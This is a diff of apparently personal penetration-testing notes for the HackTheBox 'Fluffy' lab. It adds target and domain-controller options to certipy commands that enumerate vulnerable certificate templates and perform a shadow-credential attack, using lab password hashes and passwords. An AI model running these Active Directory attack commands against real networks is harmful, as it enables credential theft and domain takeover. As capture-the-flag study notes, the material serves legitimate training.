@@ -3178,15 +3178,15 @@ netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-m
 
 ```
 # get info of account ca_svc
-certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read  -target 10.48.172.106 -dc-ip  10.48.172.106
 
 # get a list of all the templates    ( hash or clear text)
-certipy find -u j.fleischman@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8   -stdout
+certipy find -u j.fleischman@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8   -stdout  -target 10.48.172.106 -dc-ip  10.48.172.106
 
 # find templates vuln 
-certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
+certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout  -target 10.48.172.106 -dc-ip  10.48.172.106
 or
-certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -text -stdout -vulnerable
+certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -text -stdout -vulnerable  -target 10.48.172.106 -dc-ip  10.48.172.106
 
 # Shadow Credential  (  p.agila need have GenericWrite over winrm_svc , can targeted Kerberoast (give the user a SPN, get a hash, and try to break it to get their password))
 certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
